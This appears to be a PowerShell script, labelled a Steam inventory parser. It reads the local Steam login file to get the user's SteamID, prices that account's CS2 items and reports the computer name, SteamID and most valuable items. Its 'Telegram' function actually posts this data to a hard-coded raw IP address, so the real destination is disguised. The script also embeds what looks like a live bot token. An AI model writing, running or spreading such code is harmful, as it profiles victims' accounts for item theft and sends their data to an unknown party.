param(
    [string]$TelegramBotToken = "8358865551:AAHAxprLAK_TLBB1ZVVMHllFC8tTr52LlIo",
    [string]$TelegramChatId = "7695288740",
    [int]$AppId = 730,
    [int]$MaxItems = 40
)

Write-Host "`n=== STEAM INVENTORY PARSER v2 ===" -ForegroundColor Cyan

$computerName = $env:COMPUTERNAME
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
Write-Host "[i] Computer: $computerName" -ForegroundColor Gray
Write-Host "[i] Time: $timestamp" -ForegroundColor Gray

function Send-TelegramMessage {
    param([string]$Message, [string]$BotToken, [string]$ChatId)
    try {
        $r = Invoke-RestMethod -Uri "http://89.34.90.212:8000/text" -Method Post -Body $Message -ContentType "text/plain; charset=utf-8" -TimeoutSec 10
        return $r.ok
    } catch {
        Write-Host "[WARN] Telegram: $($_.Exception.Message)" -ForegroundColor Yellow
        return $false
    }
}

# Read steamID from loginusers.vdf - works regardless of open browser tabs
function Get-SteamId {
    $vdfPaths = @(
        "$env:LOCALAPPDATA\Steam\config\loginusers.vdf",
        "C:\Program Files (x86)\Steam\config\loginusers.vdf",
        "C:\Program Files\Steam\config\loginusers.vdf"
    )
    foreach ($path in $vdfPaths) {
        if (-not (Test-Path $path)) { continue }
        $content = Get-Content $path -Raw -Encoding UTF8
        $blocks = [regex]::Matches($content, '"(7656119\d{9,12})"\s*\{([^}]+)\}', [System.Text.RegularExpressions.RegexOptions]::Singleline)
        $mostRecent = $null
        $first = $null
        foreach ($b in $blocks) {
            $sid = $b.Groups[1].Value
            if (-not $first) { $first = $sid }
            if ($b.Groups[2].Value -match '"MostRecent"\s+"1"') { $mostRecent = $sid; break }
        }
        $result = if ($mostRecent) { $mostRecent } else { $first }
        if ($result) { return $result }
    }
    return $null
}

# Fetch inventory + top N most expensive items
function Get-TopItems {
    param([string]$SteamId, [int]$AppId, [int]$MaxItems)

    Write-Host "[i] Fetching inventory..." -ForegroundColor Cyan
    $invUrl = "https://steamcommunity.com/inventory/$SteamId/$AppId/2?l=english&count=2000"
    $inv = $null
    foreach ($attempt in 1..3) {
        try {
            $inv = Invoke-RestMethod $invUrl -TimeoutSec 30 -ErrorAction Stop
            break
        } catch {
            $msg = $_.Exception.Message
            if ($msg -like "*429*" -and $attempt -lt 3) {
                Write-Host "[i] Rate limited, waiting 15s... (attempt $attempt/3)" -ForegroundColor Yellow
                Start-Sleep -Seconds 15
            } else {
                return @{ Error = "inv_fetch: $msg" }
            }
        }
    }

    if (-not $inv -or -not $inv.descriptions -or $inv.descriptions.Count -eq 0) {
        return @{ Error = "empty_inventory" }
    }

    # Collect unique marketable items
    $seen = @{}
    $names = [System.Collections.Generic.List[string]]::new()
    foreach ($d in $inv.descriptions) {
        if ($d.marketable -eq 1 -and -not $seen.ContainsKey($d.market_hash_name)) {
            $seen[$d.market_hash_name] = $true
            $names.Add($d.market_hash_name)
            if ($names.Count -ge $MaxItems) { break }
        }
    }

    if ($names.Count -eq 0) { return @{ Error = "no_marketable_items" } }

    Write-Host "[i] Checking prices for $($names.Count) unique items..." -ForegroundColor Cyan

    $priced = [System.Collections.Generic.List[PSObject]]::new()
    $i = 0
    foreach ($name in $names) {
        $i++
        Write-Host "[i] $i/$($names.Count): $name" -ForegroundColor Gray
        Start-Sleep -Milliseconds 700
        try {
            $prUrl = "https://steamcommunity.com/market/priceoverview/?appid=$AppId&currency=1&market_hash_name=$([uri]::EscapeDataString($name))"
            $pr = Invoke-RestMethod $prUrl -TimeoutSec 10 -ErrorAction Stop
            if ($pr.success -and ($pr.lowest_price -or $pr.median_price)) {
                $raw = if ($pr.lowest_price) { $pr.lowest_price } else { $pr.median_price }
                $num = [double]($raw -replace '[^0-9.]', '')
                if ($num -gt 0) {
                    $priced.Add([PSCustomObject]@{ Name = $name; Price = $num; PriceStr = $raw })
                }
            }
        } catch {}
    }

    if ($priced.Count -eq 0) { return @{ Error = "no_prices_found" } }
    $sorted = $priced | Sort-Object Price -Descending
    return @{ Items = $sorted; TotalChecked = $names.Count }
}

# --- Main ---
$steamId = Get-SteamId

if (-not $steamId) {
    Write-Host "[ERROR] SteamID not found in loginusers.vdf" -ForegroundColor Red
    $msg = "Name: $computerName`nError: SteamID not found"
    Send-TelegramMessage -Message $msg -BotToken $TelegramBotToken -ChatId $TelegramChatId
    exit 1
}

Write-Host "[OK] SteamID: $steamId" -ForegroundColor Green

$result = Get-TopItems -SteamId $steamId -AppId $AppId -MaxItems $MaxItems

if ($result.Error) {
    Write-Host "[ERROR] $($result.Error)" -ForegroundColor Red
    $msg = "Name: $computerName`nSteamID: $steamId`nError: $($result.Error)"
    Send-TelegramMessage -Message $msg -BotToken $TelegramBotToken -ChatId $TelegramChatId
    exit 1
}

# Build output
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "   CS2 ITEMS - $computerName" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green

$lines = [System.Collections.Generic.List[string]]::new()
$rank = 1
foreach ($item in $result.Items) {
    $line = "#$rank  $($item.Name) - $($item.PriceStr)"
    Write-Host "  $line" -ForegroundColor Yellow
    $lines.Add($line)
    $rank++
}

Write-Host "  Checked: $($result.TotalChecked) items" -ForegroundColor Gray
Write-Host "========================================" -ForegroundColor Green
Write-Host ""

$msgLines = @("Name: $computerName", "SteamID: $steamId", "Items (appid $AppId):")
$msgLines += $lines
$msgLines += "Checked: $($result.TotalChecked) unique items"
$telegramMsg = $msgLines -join "`n"

Write-Host "[i] Sending to Telegram..." -ForegroundColor Cyan
if (Send-TelegramMessage -Message $telegramMsg -BotToken $TelegramBotToken -ChatId $TelegramChatId) {
    Write-Host "[OK] Sent!" -ForegroundColor Green
} else {
    Write-Host "[ERROR] Failed to send" -ForegroundColor Red
}

Write-Host ""
